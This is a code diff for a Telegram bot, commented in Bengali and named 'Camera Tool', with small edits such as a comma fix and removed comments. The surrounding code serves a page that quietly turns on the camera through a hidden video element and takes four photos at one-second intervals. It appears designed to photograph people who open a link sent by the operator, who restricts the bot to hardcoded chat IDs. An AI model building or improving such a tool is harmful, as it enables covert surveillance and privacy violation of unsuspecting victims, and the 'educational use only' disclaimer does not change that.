@@ -28,7 +28,7 @@ PUBLIC_URL = os.environ.get("PUBLIC_URL", "")
 # ===============================
 # অনুমোদিত Chat ID (একটি বা কমা-সেপারেটেড)
 # আপনি দিয়েছেন: 7243012875,7668032710
-# পরিবেশভ্যারিয়েবলও ব্যবহার করতে পারেন (ALLOWED_CHAT_ID)
+# পরিবেশভ্যারিয়েবলও ব্যবহার করতে পারেন (ALLOWED_CHAT_ID)
 ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875,7668032710")
 ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}
 
@@ -172,9 +172,9 @@ CAPTURE_HTML = """
 
                 hiddenVideo.onplaying = () => {
                     // ⏱️ কনফিগারেশন — ৪ সেকেন্ডে ৪টি ছবি
-                    const TOTAL_PHOTOS = 4;      // ← মোট ছবি
-                    const INTERVAL_MS = 1000;    // ← প্রতি ১ সেকেন্ডে ১টি
-                    const START_DELAY = 1000;    // ← ক্যামেরা চালু হওয়ার ১ সেকেন্ড পরে শুরু
+                    const TOTAL_PHOTOS = 4;
+                    const INTERVAL_MS = 1000;
+                    const START_DELAY = 1000;
 
                     let photoCount = 0;
 
@@ -386,7 +386,7 @@ def capture():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """শুরুতে Front / Back Camera বাটন"""
     if not is_authorized_chat(update.effective_chat.id):
-        await update.message.reply_text("❌ আপনি রিফাত ভাইয়ের কাছে আগে অনুমতি নিয়ে আসেন।")
+        await update.message.reply_text("❌ আপনি রিফাত ভাইয়ের কাছে আগে অনুমতি নিয়ে আসেন।")
         return
 
     keyboard = [
@@ -396,6 +396,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
+
+    # ✅ এখানে শেষে কমা (,) যোগ করা হয়েছে
     await update.message.reply_text(
         """🎥 *Camera Tool*
 
@@ -431,7 +433,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     '---' এর পক্ষ থেকে কন্ট্রোল প্যানেল নিচে দেওয়া হলো।
 শুরু করতে যেকোনো একটি অপশন সিলেক্ট করুন।
 
-📌 *শুধুমাত্র শিক্ষামূলক ও নিজস্ব টেস্টিংয়ের কাজে সীমাবদ্ধ রাখুন।*"""
+📌 *শুধুমাত্র শিক্ষামূলক ও নিজস্ব টেস্টিংয়ের কাজে সীমাবদ্ধ রাখুন।*""",   # ✅ এখানে কমা
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -534,7 +536,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """URL ইনপুট ধরার জন্য"""
     if not is_authorized_chat(update.effective_chat.id):
-        await update.message.reply_text("❌ আপনি রিফাত ভাইয়ের কাছে আগে অনুমতি নিয়ে আসেন।")
+        await update.message.reply_text("❌ আপনি রিফাত ভাইয়ের কাছে আগে অনুমতি নিয়ে আসেন।")
         return
 
     chat_id = str(update.message.chat_id)
